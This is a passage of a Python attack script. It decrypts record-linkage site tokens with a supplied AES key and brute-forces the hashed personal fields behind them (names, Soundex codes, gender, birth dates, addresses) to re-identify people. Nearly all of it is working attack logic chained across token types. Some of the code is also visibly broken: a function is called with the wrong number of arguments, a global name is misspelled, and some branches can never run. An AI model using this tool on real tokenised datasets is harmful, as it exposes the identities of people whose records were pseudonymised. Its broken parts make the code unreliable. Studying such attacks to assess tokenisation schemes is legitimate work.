    fn_prefix = init_hasher(fn_b + SEP)
    hits = {}
    for addr_raw in address_list_raw:
        street_b, number_b_from_split = split_address_b(addr_raw, lang)
        if not street_b: continue
        full_addrs_b = []
        norm_street_only = street_b
        if exclude_house_numbers:
            full_addrs_b.append(norm_street_only)
        else:
            if lang == "de":
                for num_b in HOUSE_NUMBERS: full_addrs_b.append(norm_street_only + num_b)
                if number_b_from_split: full_addrs_b.append(norm_street_only + number_b_from_split)
                else: full_addrs_b.append(norm_street_only)
            elif lang == "us":
                for num_b in HOUSE_NUMBERS: full_addrs_b.append(num_b + norm_street_only)
                if number_b_from_split: full_addrs_b.append(number_b_from_split + norm_street_only)
                else: full_addrs_b.append(norm_street_only)
            else:
                full_addrs_b.append(street_b + number_b_from_split)
        for addr_b in set(full_addrs_b):
            if not addr_b: continue
            h = fn_prefix.copy(); h.update(addr_b)
            mt = digest_and_count(h)
            if contains(mt): hits[mt] = (fn_b, addr_b)
    return hits

# ==============================================================================
# PURE BRUTE-FORCE WRAPPERS (CONTEXT PRESERVATION)
# ==============================================================================
# These functions wrap the core attack logic but add a crucial feature:
# They preserve the "Context" (e.g., the T2 Soundex codes) along with the hits.
# This is necessary because in Brute-Force mode, we don't have a static dictionary
# to look up Soundex codes later; we must carry the recovered Soundex forward
# to use it as a constraint in subsequent pivots.

def attack_T1_via_T2_pure(master_tokens, sdx_ln_b, sdx_fn_b, g_b, dob_b, LN_BY_SDX, FN_BY_SDX, init_hasher):
    """
    Wrapper for T1 Attack (via T2) that preserves T2 context.
    
    Purpose:
        When we crack T1 using T2, we want to remember the T2 values (Soundexes)
        that allowed us to find this T1. This T2 info is needed later to crack T4.
        
    Returns:
        Map { master_token: ( t1_preimage, t2_preimage ) }
        where:
          t1_preimage = (ln, fi, g, dob)
          t2_preimage = (sdx_ln, sdx_fn, g, dob)
    """
    hits_with_context = {}
    
    # 1. Execute the core attack logic
    # (Note: In pure brute-force, LN_BY_SDX might be empty or unused if using generators, 
    #  depending on how you wired the inner function. If using 'attack_T1_via_T2', 
    #  ensure it supports the generator logic or that you are using the generator variant.)
    t1_hits = attack_T1_via_T2(master_tokens, sdx_ln_b, sdx_fn_b, g_b, dob_b, LN_BY_SDX, FN_BY_SDX, init_hasher)
    
    # 2. Attach Context
    t2_preimage = (sdx_ln_b, sdx_fn_b, g_b, dob_b)
    
    for mt, t1_preimage in t1_hits.items():
        # Save both the new T1 hit AND the old T2 hit that generated it
        hits_with_context[mt] = (t1_preimage, t2_preimage)
        
    return hits_with_context

def attack_T7_via_T1_pure(master_tokens, t1_preimage, t2_preimage, init_hasher):
    """
    Wrapper for T7 Attack (via T1) that preserves T2 context.
    
    Path: T2 -> T1 -> T7
    We need to keep carrying T2 forward so it's available for the final T4 step.
    """
    hits_with_context = {}
    (ln_b, fi_b, g_b, dob_b) = t1_preimage
    
    # 1. Execute core T7 attack using T1 info (Last Name + Initial)
    t7_hits = attack_T7_via_T1(master_tokens, ln_b, fi_b, g_b, dob_b, init_hasher)
    
    # 2. Attach Context
    for mt, t7_preimage in t7_hits.items():
        # Result: T7 hit + the original T2 Soundex codes
        hits_with_context[mt] = (t7_preimage, t2_preimage)
        
    return hits_with_context

def attack_T7_via_T2_pure(master_tokens, sdx_ln_b, sdx_fn_b, g_b, dob_b, init_hasher):
    """
    Wrapper for T7 Attack (via T2 direct) that preserves T2 context.
    
    Path: T2 -> T7
    """
    hits_with_context = {}
    
    # 1. Execute core T7 attack using T2 info (Soundexes)
    t7_hits = attack_T7_via_T2(master_tokens, sdx_ln_b, sdx_fn_b, g_b, dob_b, init_hasher)
    
    # 2. Attach Context
    t2_preimage = (sdx_ln_b, sdx_fn_b, g_b, dob_b)
    
    for mt, t7_preimage in t7_hits.items():
        hits_with_context[mt] = (t7_preimage, t2_preimage)
        
    return hits_with_context

def pivot_to_T4_via_T1_T2_pure(master_tokens, t1_preimage, t2_preimage, init_hasher):
    """
    Pivot:          T4 (Full Name) from T1 (Initial) + T2 (Soundex).
    Mode:           Pure Brute-Force (Generator).
    
    Strategy:
        We have the exact Last Name (from T1).
        We have the First Name Soundex (from T2 context).
        We DO NOT have a dictionary.
        
        We must use the Soundex Generator to create all possible First Names 
        that match the Soundex code (`sdx_fn`).
        We filter these generated names to ensure they match the First Initial (`fi`) from T1.
        
    Complexity:     O(Generated_First_Names) ~ 50-100 candidates per record.
    """
    hits = {}
    contains = master_tokens.__contains__
    
    # Unpack Context
    (ln_b, fi_b, g_b, dob_b) = t1_preimage
    (sdx_ln_b, sdx_fn_b, _, _) = t2_preimage
    
    try:
        sdx_fn_str = sdx_fn_b.decode("utf-8")
    except Exception:
        return hits
        
    # Optimization: Pre-calculate the hash state for the known parts (Last Name)
    h_ln = init_hasher(ln_b + SEP)
    
    # Generator Loop
    # Generate all first names for the given Soundex (e.g., J500 -> John, Jon, Jan...)
    # Max length 15 covers vast majority of names.
    for fn_b in generate_soundex_preimages(sdx_fn_str, max_length=15):
        if not fn_b:
            continue
            
        # Implicit Filter: generate_soundex_preimages for 'J500' 
        # naturally produces names starting with 'J'.
        # So we don't strictly need to check `fn_b[0] == fi_b` if Soundex is valid.
        # But explicitly:
        # if fn_b[:1] != fi_b: continue 

        # Hash T4: H(ln|fn|g|dob)
        h_fn = h_ln.copy(); h_fn.update(fn_b); h_fn.update(SEP)
        h_sig = h_fn.copy(); h_sig.update(g_b); h_sig.update(SEP)
        h_final = h_sig.copy(); h_final.update(dob_b)
        
        mt = digest_and_count(h_final)
        if contains(mt):
            hits[mt] = (ln_b, fn_b, g_b, dob_b)
            
    return hits

# =============================
# Dictionaries / Distribution Loading
# =============================

def use_dictionaries(lang: str, bruteforce: bool):
    """Load hardcoded dictionaries from text files."""
    global TOP_FIRST, TOP_LAST, TOP_ADDRESS
    TOP_FIRST, TOP_LAST, TOP_ADDRESS = [], [], [] 
    street_file = "strassennamen.txt" if lang == "de" else "streetnames.txt"
    try:
        with open(street_file, "r", encoding="utf-8") as f:
            TOP_ADDRESS = [line.strip().lower() for line in f if line.strip() and not line.startswith("#")]
    except FileNotFoundError:
         print(f"[Warning] Street name file not found: {street_file}")

    if not bruteforce:
        first_file = "vornamen.txt" if lang == "de" else "firstnames.txt"
        last_file = "nachnamen.txt" if lang == "de" else "lastnames.txt"
        try:
            with open(first_file, "r", encoding="utf-8") as f:
                TOP_FIRST = [line.strip().lower() for line in f if line.strip() and not line.startswith("#")]
        except FileNotFoundError:
             print(f"[Warning] First name file not found: {first_file}")
        try:
            with open(last_file, "r", encoding="utf-8") as f:
                TOP_LAST = [line.strip().lower() for line in f if line.strip() and not line.startswith("#")]
        except FileNotFoundError:
             print(f"[Warning] Last name file not found: {last_file}")
    print(f"[*] Using hardcoded dictionaries: firsts={len(TOP_FIRST)}, lasts={len(TOP_LAST)}, addresses={len(TOP_ADDRESS)}")


def load_distribution(dist_file: str, top_n: int, bruteforce: bool):
    """Load top N entries from a CSV distribution file."""
    global TOP_FIRST, TOP_LAST, TOP_ADDRESS
    TOP_FIRST, TOP_LAST, TOP_ADDRESS = [], [], []
    try:
        df = pd.read_csv(dist_file)
    except FileNotFoundError:
        raise SystemExit(f"Error: Distribution file not found: {dist_file}")

    required_cols = ["address"]
    if not bruteforce:
        required_cols.extend(["first_name", "last_name"])

    missing = [c for c in required_cols if c not in df.columns]
    if missing:
        raise ValueError(f"Distribution file '{dist_file}' missing required columns for selected mode: {missing}")

    TOP_ADDRESS = df["address"].astype(str).str.lower().value_counts().head(top_n).index.tolist()
    if not bruteforce:
        TOP_FIRST = df["first_name"].astype(str).str.lower().value_counts().head(top_n).index.tolist()
        TOP_LAST = df["last_name"].astype(str).str.lower().value_counts().head(top_n).index.tolist()

    print(f"[*] Loaded distribution file '{dist_file}': top_n={top_n} (firsts={len(TOP_FIRST)}, lasts={len(TOP_LAST)}, addresses={len(TOP_ADDRESS)})")

# ==============================================================================
# GLOBAL CONSTANTS AND PRECOMPUTATIONS
# ==============================================================================

OP_FIRST: list = []
TOP_LAST: list = []
TOP_ADDRESS: list = []
SEX_B = [b"m", b"f", b"u"]
INITIALS_B = [bytes([c]) for c in range(ord('a'), ord('z')+1)]
ZIP3_PARTS = [f"{z:03d}".encode("utf-8") for z in range(1000)]

today = date.today()
min_age, max_age = 18, 80
min_year, max_year = today.year - max_age, today.year - min_age

# ==============================================================================
# MAIN ORCHESTRATOR
# ==============================================================================

def run_attack(args):
    # Load distribution for frequency-based dictionaries
    if args.dist_file:
        load_distribution(args.dist_file, args.top_n)
    elif args.dist_file == "" and args.bruteforce == False:
        use_dictionaries(args.lang, args.bruteforce)
    elif args.dist_file == "" and args.bruteforce == True:
        print("[*] Running in pure brute-force mode (use only street names).")
        use_dictionaries(args.lang, args.bruteforce)
    else:
        raise SystemExit("--dist-file or --lang is required to provide the frequency distribution CSV")

    # Bytes normalization
    TOP_FIRST_B  = to_bytes_list(TOP_FIRST)
    TOP_LAST_B   = to_bytes_list(TOP_LAST)
    TOP_ADDRESS_ = TOP_ADDRESS[:] 
    DOBS_B       = precompute_dobs(min_year, max_year)
    FN_BY_INITIAL, FN_BY_SDX, LN_BY_SDX, SDX_LAST, SDX_FIRST, SDX_LAST_B, SDX_FIRST_B = build_soundex_maps(TOP_FIRST_B, TOP_LAST_B)
    HOUSE_NUMBERS = precompute_house_numbers(args.lang, max_de=500, max_us=1000)
    FIRST3_MAP   = build_first3_map(TOP_FIRST_B)  

    # reverse soundex cache for last names
    last_to_sdx = {ln_b: sdx for sdx, names in LN_BY_SDX.items() for ln_b in names}

    print("[*] Precomputing all possible Soundex codes...")
    ALL_SDX_LN, ALL_SDX_FN = precompute_all_soundex_codes()
    print(f"    -> Generated {len(ALL_SDX_LN)} LN codes and {len(ALL_SDX_FN)} FN codes.")

    t1_hits = {}
    t2_hits = {}
    t3_pivot_hits = {}
    t4_pivot_hits = {}
    t7_hits = {}
    t9_pivot_hits = {}
    t1_time = t2_time = t3_time = t4_time = t7_time = t9_time = None

    # Master function
    if args.master_salt:
        ms = parse_bytes(args.master_salt)
        master_func = lambda s: master_hmac(ms, s)
        init_hasher = make_init_hasher(ms)
        print("[*] Using HMAC-SHA256(master_salt, token_input).")
    else:
        master_func = lambda s: master_sha256(s)
        init_hasher = make_init_hasher(None)
        print("[*] Using SHA-256(token_input) (no master salt).")

    # Site key: AES-256 requires 32 bytes
    site_key = parse_bytes(args.site_key, expect_len=32)
    print(f"[*] Using AES-256-ECB for site token decryption (key length={len(site_key)}).")

    cols = [c.strip() for c in args.columns.split(",")]
    # Load & decrypt
    raw = load_site_tokens(args.infile, cols)
    rows = raw["_RAW"]
    dec = decrypt_columns(rows, site_key, cols)

    # If everything is empty, bail early with a hint
    if all(len(dec[c]) == 0 for c in cols):
        print("[!] No master tokens decrypted. Check: correct AES mode (ECB), key (32 bytes), base64 format, and that tokens are actually encrypted site tokens.")
        return

    # =============================
    # MODE 1: DICTIONARY/REFERENCE MODE
    # =============================

    # =============================
    # T1 --> T2 --> T4 --> T3 --> T9
    # =============================

    if args.columns == "T1,T2,T4,T3,T9":
        # Phase 1: attack lowest-entropy tokens first (T1, T2)
        t1_hits = {}
        t1_time = None
        if "T1" in dec:
            print("[*] Attacking T1 (ln|fi|g|dob)...")
            start = time.time()
            #t1_hits = attack_entropy_first_T1(master_func, dec["T1"], label="T1")
            t1_hits = attack_T1_fast(dec["T1"], TOP_LAST_B, INITIALS_B, DOBS_B, init_hasher)
            t1_time = time.time() - start
            print(f"     -> Found {len(t1_hits)} T1 preimages")
            print(f"[Timer] T1: {t1_time:.2f} seconds")
            print(f"[HASHES] Total hash computations so far: {HASHES}")

        t2_hits = {}
        t2_time = None
        if "T2" in dec:
            print("[*] Attacking T2 (sdx(ln)|sdx(fn)|g|dob) using T1 (ln|fi|g|dob)...")
            start = time.time()
            #t2_hits = attack_entropy_first_T2(master_func, dec["T2"], label="T2")
            for _mt1, (ln_b, fi_b, g_b, dob_b) in t1_hits.items():
                out = attack_T2_via_T1(dec["T2"], SDX_FIRST, ln_b, fi_b, g_b, dob_b, last_to_sdx, init_hasher)
                t2_hits.update(out)
            t2_time = time.time() - start
            print(f"     -> Found {len(t2_hits)} T2 preimages")
            print(f"[Timer] T2: {t2_time:.2f} seconds")
            print(f"[HASHES] Total hash computations so far: {HASHES}")

        # Phase 2: pivot into T4 using knowledge from T1 (and optionally T2)
        t4_pivot_hits = {}
        t4_time = None
        if "T4" in dec and t1_hits:
            print("[*] Pivoting to T4 (ln|fn|g|dob) using T1 (and T2 if available)...")
            start = time.time()
            t2_idx = defaultdict(list)
            for _mt, (sdx_ln, sdx_fn, g, dob) in t2_hits.items():
                t2_idx[(sdx_ln.decode(), g.decode(), dob.decode())].append(sdx_fn.decode())
            for _mt1, (ln_b, fi_b, g_b, dob_b) in t1_hits.items():
                sdx_ln_cached = last_to_sdx.get(ln_b) or soundex(ln_b.decode())
                key = (sdx_ln_cached, g_b.decode(), dob_b.decode())
                if key in t2_idx:
                    for sdx_fn in t2_idx[key]:
                        out = pivot_to_T4_fast(dec["T4"], FN_BY_INITIAL, FN_BY_SDX,
                                               (ln_b, fi_b, g_b, dob_b),
                                               (None, sdx_fn),
                                               init_hasher)
                        t4_pivot_hits.update(out)
                else:
                    out = pivot_to_T4_fast(dec["T4"], FN_BY_INITIAL, FN_BY_SDX,
                                           (ln_b, fi_b, g_b, dob_b),
                                           None,
                                           init_hasher)
                    t4_pivot_hits.update(out)
            t4_time = time.time() - start
            print(f"     -> Resolved {len(t4_pivot_hits)} T4 preimages via pivot")
            print(f"[Timer] T4: {t4_time:.2f} seconds")
            print(f"[HASHES] Total hash computations so far: {HASHES}")

    # =============================
    # T1 --> T2 --> T7 --> T4 --> T3 --> T9
    # =============================

    elif args.columns == "T1,T2,T7,T4,T3,T9":
        t1_hits = {}
        t1_time = None
        if "T1" in dec:
            print("[*] Attacking T1 (ln|fi|g|dob)...")
            start = time.time()
            t1_hits = attack_T1_fast(dec["T1"], TOP_LAST_B, INITIALS_B, DOBS_B, init_hasher)
            t1_time = time.time() - start
            print(f"     -> Found {len(t1_hits)} T1 preimages")
            print(f"[Timer] T1: {t1_time:.2f} seconds")
            print(f"[HASHES] Total hash computations so far: {HASHES}")

        t2_hits = {}
        t2_time = None
        if "T2" in dec:
            print("[*] Attacking T2 (sdx(ln)|sdx(fn)|g|dob) using T1 (ln|fi|g|dob)...")
            start = time.time()
            for _mt1, (ln_b, fi_b, g_b, dob_b) in t1_hits.items():
                out = attack_T2_via_T1(dec["T2"], SDX_FIRST, ln_b, fi_b, g_b, dob_b, last_to_sdx, init_hasher)
                t2_hits.update(out)
            t2_time = time.time() - start
            print(f"     -> Found {len(t2_hits)} T2 preimages")
            print(f"[Timer] T2: {t2_time:.2f} seconds")
            print(f"[HASHES] Total hash computations so far: {HASHES}")
        
        t7_hits = {}
        t7_time = None
        if "T7" in dec and t2_hits and t1_hits:
            print("[*] Attacking T7 (ln|fi3|g|dob) using T1 (ln|fi|g|dob) and T2 (sdx(ln)|sdx(fn)|g|dob)...")
            start = time.time()
            # build t1_index using cache
            if 't1_index' not in locals():
                t1_index = defaultdict(list)
                for (_mt1, (ln_b, fi_b, g_b, dob_b)) in t1_hits.items():
                    sdx_ln_cached = last_to_sdx.get(ln_b)
                    if not sdx_ln_cached:
                        try:
                            sdx_ln_cached = soundex(ln_b.decode("utf-8"))
                        except Exception:
                            continue
                    if not sdx_ln_cached:
                        continue
                    t1_index[(sdx_ln_cached, g_b, dob_b)].append((ln_b, fi_b))
            for (_mt2, (sdx_ln_b, sdx_fn_b, g_b, dob_b)) in t2_hits.items():
                key = (sdx_ln_b.decode("utf-8"), g_b, dob_b)
                for (ln_b, fi_b) in t1_index.get(key, []):
                    out = attack_T7_via_T2_T1(dec["T7"], ln_b, sdx_fn_b, g_b, dob_b, FN_BY_SDX, init_hasher)
                    t7_hits.update(out)
            t7_time = time.time() - start
            print(f"     -> Found {len(t7_hits)} T7 preimages")
            print(f"[Timer] T7: {t7_time:.2f} seconds")
            print(f"[HASHES] Total hash computations so far: {HASHES}")

        t4_pivot_hits = {}
        t4_time = None
        if "T4" in dec and t7_hits:
            print("[*] Pivoting to T4 (ln|fn|g|dob) using T7 (ln|fi3|g|dob)...")
            start = time.time()
            for _mt7, (ln_b, fi3_b, g_b, dob_b) in t7_hits.items():
                out = pivot_to_T4_via_T7(dec["T4"], ln_b, fi3_b, g_b, dob_b, FIRST3_MAP, init_hasher)
                t4_pivot_hits.update(out)
            t4_time = time.time() - start
            print(f"     -> Resolved {len(t4_pivot_hits)} T4 preimages via pivot")
            print(f"[Timer] T4: {t4_time:.2f} seconds")
            print(f"[HASHES] Total hash computations so far: {HASHES}")

    # =============================
    # T2 --> T1 --> T4 --> T3 --> T9
    # =============================

    elif args.columns == "T2,T1,T4,T3,T9":
        t2_hits = {}
        t2_time = None
        if "T2" in dec:
            print("[*] Attacking T2 (sdx(ln)|sdx(fn)|g|dob) with FULL SOUNDEX BRUTE-FORCE...")
            start = time.time()
            t2_hits = attack_T2_fast(dec["T2"], list(ALL_SDX_LN), list(ALL_SDX_FN), DOBS_B, init_hasher)
            t2_time = time.time() - start
            print(f"     -> Found {len(t2_hits)} T2 preimages")
            print(f"[Timer] T2: {t2_time:.2f} seconds")
            print(f"[HASHES] Total hash computations so far: {HASHES}")

        t1_hits = {}
        t1_time = None
        if "T1" in dec:
            print("[*] Attacking T1 (ln|fi|g|dob) using T2 (sdx(ln)|sdx(fn)|g|dob) preimages...")
            start = time.time()
            for _mt2, (sdx_ln_b, sdx_fn_b, g_b, dob_b) in t2_hits.items():
                # Use the new generator-based attack
                out = attack_T1_via_T2(dec["T1"], sdx_ln_b, sdx_fn_b, g_b, dob_b, LN_BY_SDX, FN_BY_SDX, init_hasher)
                t1_hits.update(out)
            t1_time = time.time() - start
            print(f"     -> Found {len(t1_hits)} T1 preimages")
            print(f"[Timer] T1: {t1_time:.2f} seconds")
            print(f"[HASHES] Total hash computations so far: {HASHES}")

        t4_pivot_hits = {}
        t4_time = None
        if "T4" in dec and t1_hits:
            print("[*] Pivoting to T4 (ln|fn|g|dob) using T1 (and T2 if available)...")
            start = time.time()
            t2_idx = defaultdict(list)
            for _mt, (sdx_ln, sdx_fn, g, dob) in t2_hits.items():
                t2_idx[(sdx_ln.decode(), g.decode(), dob.decode())].append(sdx_fn.decode())
            for _mt1, (ln_b, fi_b, g_b, dob_b) in t1_hits.items():
                sdx_ln_cached = last_to_sdx.get(ln_b)
                if not sdx_ln_cached:
                    try: sdx_ln_cached = soundex(ln_b.decode())
                    except Exception: sdx_ln_cached = ""
                        
                key = (sdx_ln_cached, g_b.decode(), dob_b.decode())
                
                # We need to find the T4 from T1. T2 info helps narrow it down.
                # Use dictionary-based pivot if T2 not helpful
                out = pivot_to_T4_fast(dec["T4"], FN_BY_INITIAL, FN_BY_SDX,
                                       (ln_b, fi_b, g_b, dob_b),
                                       None, # Base pivot on T1 dict
                                       init_hasher)
                t4_pivot_hits.update(out)

            t4_time = time.time() - start
            print(f"     -> Resolved {len(t4_pivot_hits)} T4 preimages via pivot")
            print(f"[Timer] T4: {t4_time:.2f} seconds")
            print(f"[HASHES] Total hash computations so far: {HASHES}")
        
    # =============================
    # T2 --> T1 --> T7 --> T4 --> T3 --> T9
    # =============================

    elif args.columns == "T2,T1,T7,T4,T3,T9":
        t2_hits = {}
        t2_time = None
        if "T2" in dec:
            print("[*] Attacking T2 (sdx(ln)|sdx(fn)|g|dob) with FULL SOUNDEX BRUTE-FORCE...")
            start = time.time()
            t2_hits = attack_T2_fast(dec["T2"], list(ALL_SDX_LN), list(ALL_SDX_FN), DOBS_B, init_hasher)
            t2_time = time.time() - start
            print(f"     -> Found {len(t2_hits)} T2 preimages")
            print(f"[Timer] T2: {t2_time:.2f} seconds")
            print(f"[HASHES] Total hash computations so far: {HASHES}")

        t1_hits = {}
        t1_time = None
        if "T1" in dec:
            print("[*] Attacking T1 (ln|fi|g|dob) using T2 (sdx(ln)|sdx(fn)|g|dob) preimages...")
            start = time.time()
            for _mt2, (sdx_ln_b, sdx_fn_b, g_b, dob_b) in t2_hits.items():
                out = attack_T1_via_T2(dec["T1"], sdx_ln_b, sdx_fn_b, g_b, dob_b, LN_BY_SDX, FN_BY_SDX, init_hasher)
                t1_hits.update(out)
            t1_time = time.time() - start
            print(f"     -> Found {len(t1_hits)} T1 preimages")
            print(f"[Timer] T1: {t1_time:.2f} seconds")
            print(f"[HASHES] Total hash computations so far: {HASHES}")

        t7_hits = {}
        t7_time = None
        if "T7" in dec:
            print("[*] Attacking T7 (ln|fi3|g|dob) using T1 (ln|fi|g|dob) preimages...")
            start = time.time()
            for _mt1, (ln_b, fi_b, g_b, dob_b) in t1_hits.items():
                out = attack_T7_via_T1(dec["T7"], ln_b, fi_b, g_b, dob_b, init_hasher)
                t7_hits.update(out)
            t7_time = time.time() - start
            print(f"     -> Found {len(t7_hits)} T7 preimages")
            print(f"[Timer] T7: {t7_time:.2f} seconds")
            print(f"[HASHES] Total hash computations so far: {HASHES}")

        t4_pivot_hits = {}
        t4_time = None
        if "T4" in dec and t7_hits:
            print("[*] Pivoting to T4 (ln|fn|g|dob) using T7 (ln|fi3|g|dob)...")
            start = time.time()
            for _mt7, (ln_b, fi3_b, g_b, dob_b) in t7_hits.items():
                out = pivot_to_T4_via_T7(dec["T4"], ln_b, fi3_b, g_b, dob_b, FIRST3_MAP, init_hasher)
                t4_pivot_hits.update(out)
            t4_time = time.time() - start
            print(f"     -> Resolved {len(t4_pivot_hits)} T4 preimages via pivot")
            print(f"[Timer] T4: {t4_time:.2f} seconds")
            print(f"[HASHES] Total hash computations so far: {HASHES}")

    # =============================
    # T2 --> T7 --> T4 --> T3 --> T9
    # =============================

    elif args.columns == "T2,T7,T4,T3,T9":
        t2_hits = {}
        t2_time = None
        if "T2" in dec:
            print("[*] Attacking T2 (sdx(ln)|sdx(fn)|g|dob) with FULL SOUNDEX BRUTE-FORCE...")
            start = time.time()
            t2_hits = attack_T2_fast(dec["T2"], list(ALL_SDX_LN), list(ALL_SDX_FN), DOBS_B, init_hasher)
            t2_time = time.time() - start
            print(f"     -> Found {len(t2_hits)} T2 preimages")
            print(f"[Timer] T2: {t2_time:.2f} seconds")
            print(f"[HASHES] Total hash computations so far: {HASHES}")

        t7_hits = {}
        t7_time = None
        if "T7" in dec:
            print("[*] Attacking T7 (ln|fi3|g|dob) using T2 (sdx(ln)|sdx(fn)|g|dob) preimages...")
            start = time.time()
            for _mt2, (sdx_ln_b, sdx_fn_b, g_b, dob_b) in t2_hits.items():
                out = attack_T7_via_T2(dec["T7"], sdx_ln_b, sdx_fn_b, g_b, dob_b, init_hasher)
                t7_hits.update(out)
            t7_time = time.time() - start
            print(f"     -> Found {len(t7_hits)} T7 preimages")
            print(f"[Timer] T7: {t7_time:.2f} seconds")
            print(f"[HASHES] Total hash computations so far: {HASHES}")

        t4_pivot_hits = {}
        t4_time = None
        if "T4" in dec and t7_hits:
            print("[*] Pivoting to T4 (ln|fn|g|dob) using T7 (ln|fi3|g|dob)...")
            start = time.time()
            for _mt7, (ln_b, fi3_b, g_b, dob_b) in t7_hits.items():
                sdx_ln_str = ""
                try:
                    sdx_ln_str = soundex(ln_b.decode())
                except Exception:
                    pass
                t2_matches = []
                try:
                    sdx_ln_str = soundex(ln_b.decode())
                    for mt, (sdx_l, sdx_f, g, dob) in t2_hits.items():
                        if g == g_b and dob == dob_b and sdx_l.decode() == sdx_ln_str:
                            t2_matches.append((sdx_l, sdx_f))
                except Exception:
                    pass
                
                if t2_matches:
                    for sdx_l, sdx_f in t2_matches:
                        out = pivot_to_T4_via_T7_T2(dec["T4"], sdx_l, sdx_f, fi3_b, g_b, dob_b, LN_BY_SDX, FN_BY_SDX, init_hasher)
                        t4_pivot_hits.update(out)
                
            t4_time = time.time() - start
            print(f"     -> Resolved {len(t4_pivot_hits)} T4 preimages via pivot")
            print(f"[Timer] T4: {t4_time:.2f} seconds")
            print(f"[HASHES] Total hash computations so far: {HASHES}")

    # =============================
    # T1 --> T7 --> T4 --> T3 --> T9
    # =============================

    elif args.columns == "T1,T7,T4,T3,T9":
        t1_hits = {}
        t1_time = None
        if "T1" in dec:
            print("[*] Attacking T1 (ln|fi|g|dob)...")
            start = time.time()
            #t1_hits = attack_entropy_first_T1(master_func, dec["T1"], label="T1")
            t1_hits = attack_T1_fast(dec["T1"], TOP_LAST_B, INITIALS_B, DOBS_B, init_hasher)
            t1_time = time.time() - start
            print(f"     -> Found {len(t1_hits)} T1 preimages")
            print(f"[Timer] T1: {t1_time:.2f} seconds")
            print(f"[HASHES] Total hash computations so far: {HASHES}")

        t7_hits = {}
        t7_time = None
        if "T7" in dec and t1_hits:
            print("[*] Attacking T7 (ln|fi3|g|dob) using T1 (ln|fi|g|dob)...")
            start = time.time()
            #t7_hits = attack_entropy_first_T7(master_func, dec["T7"], label="T7")
            for _mt1, (ln_b, fi_b, g_b, dob_b) in t1_hits.items():
                out = attack_T7_via_T1(dec["T7"], ln_b, fi_b, g_b, dob_b, init_hasher)
                t7_hits.update(out)
            t7_time = time.time() - start
            print(f"     -> Found {len(t7_hits)} T7 preimages")
            print(f"[Timer] T7: {t7_time:.2f} seconds")
            print(f"[HASHES] Total hash computations so far: {HASHES}")

        t4_pivot_hits = {}
        t4_time = None
        if "T4" in dec and t7_hits:
            print("[*] Pivoting to T4 (ln|fn|g|dob) using T7...")
            start = time.time()
            for _mt7, (ln_b, fi3_b, g_b, dob_b) in t7_hits.items():
                out = pivot_to_T4_via_T7(dec["T4"], ln_b, fi3_b, g_b, dob_b, FIRST3_MAP, init_hasher)
                t4_pivot_hits.update(out)
            t4_time = time.time() - start
            print(f"     -> Resolved {len(t4_pivot_hits)} T4 preimages via pivot")
            print(f"[Timer] T4: {t4_time:.2f} seconds")
            print(f"[HASHES] Total hash computations so far: {HASHES}")

    # =============================
    # MODE 2: PURE BRUTEFORCE (GENERATOR)
    # =============================

    # =============================
    # PURE BRUTEFORCE: T2 -> T1 -> T7 -> T4 --> T3 -> T9
    # =============================

    elif args.columns == "T2,T1,T7,T4,T3,T9" and args.bruteforce == True:
        t2_hits = {}
        t2_time = None
        if "T2" in dec:
            print("[*] Attacking T2 (sdx(ln)|sdx(fn)|g|dob) with FULL SOUNDEX BRUTE-FORCE...")
            start = time.time()
            t2_hits = attack_T2_fast(dec["T2"], list(ALL_SDX_LN), list(ALL_SDX_FN), DOBS_B, init_hasher)
            t2_time = time.time() - start
            print(f"     -> Found {len(t2_hits)} T2 preimages")
            print(f"[Timer] T2: {t2_time:.2f} seconds")
            print(f"[HASHES] Total hash computations so far: {HASHES}")

        t1_hits_pure = {} # Will store {mt: ((t1_preimage), (t2_preimage))}
        t1_time = None
        if "T1" in dec:
            print("[*] (PURE) Attacking T1 using T2 preimages...")
            start = time.time()
            for _mt2, (sdx_ln_b, sdx_fn_b, g_b, dob_b) in t2_hits.items():
                # Use the new "pure" function
                out = attack_T1_via_T2_pure(dec["T1"], sdx_ln_b, sdx_fn_b, g_b, dob_b, LN_BY_SDX, FN_BY_SDX, init_hasher)
                t1_hits_pure.update(out)
            t1_time = time.time() - start
            # Extract T1 hits for reporting
            t1_hits = {mt: preimages[0] for mt, preimages in t1_hits_pure.items()}
            print(f"     -> Found {len(t1_hits)} T1 preimages")
            print(f"[Timer] T1: {t1_time:.2f} seconds")
            print(f"[HASHES] Total hash computations so far: {HASHES}")

        t7_hits_pure = {} # Will store {mt: ((t7_preimage), (t2_preimage))}
        t7_time = None
        if "T7" in dec:
            print("[*] (PURE) Attacking T7 using T1 (with T2 context)...")
            start = time.time()
            for _mt1, (t1_preimage, t2_preimage) in t1_hits_pure.items():
                # Use the new "pure" function
                out = attack_T7_via_T1_pure(dec["T7"], t1_preimage, t2_preimage, init_hasher)
                t7_hits_pure.update(out)
            t7_time = time.time() - start
            # Extract T7 hits for reporting
            t7_hits = {mt: preimages[0] for mt, preimages in t7_hits_pure.items()}
            print(f"     -> Found {len(t7_hits)} T7 preimages")
            print(f"[Timer] T7: {t7_time:.2f} seconds")
            print(f"[HASHES] Total hash computations so far: {HASHES}")

        t4_pivot_hits = {}
        t4_time = None
        if "T4" in dec and t7_hits_pure:
            print("[*] (PURE) Pivoting to T4 using T7 and T2 context...")
            start = time.time()
            for _mt7, (t7_preimage, t2_preimage) in t7_hits_pure.items():
                (ln_b, fi3_b, g_b, dob_b) = t7_preimage
                (sdx_ln_b, sdx_fn_b, _, _) = t2_preimage # g and dob are already in t7_preimage
                
                # THIS IS THE KEY: Call the correct pivot function
                out = pivot_to_T4_via_T7_T2(dec["T4"], sdx_ln_b, sdx_fn_b, fi3_b, g_b, dob_b, LN_BY_SDX, FN_BY_SDX, init_hasher)
                t4_pivot_hits.update(out)
            t4_time = time.time() - start
            print(f"     -> Resolved {len(t4_pivot_hits)} T4 preimages via pivot")
            print(f"[Timer] T4: {t4_time:.2f} seconds")
            print(f"[HASHES] Total hash computations so far: {HASHES}")

    # =============================
    # PURE BRUTEFORCE: T2 -> T7 -> T4 --> T3 -> T9
    # =============================

    elif args.columns == "T2,T7,T4,T3,T9" and args.bruteforce == True:
        t2_hits = {}
        t2_time = None
        if "T2" in dec:
            print("[*] Attacking T2 (sdx(ln)|sdx(fn)|g|dob) with FULL SOUNDEX BRUTE-FORCE...")
            start = time.time()
            t2_hits = attack_T2_fast(dec["T2"], list(ALL_SDX_LN), list(ALL_SDX_FN), DOBS_B, init_hasher)
            t2_time = time.time() - start
            print(f"     -> Found {len(t2_hits)} T2 preimages")
            print(f"[Timer] T2: {t2_time:.2f} seconds")
            print(f"[HASHES] Total hash computations so far: {HASHES}")

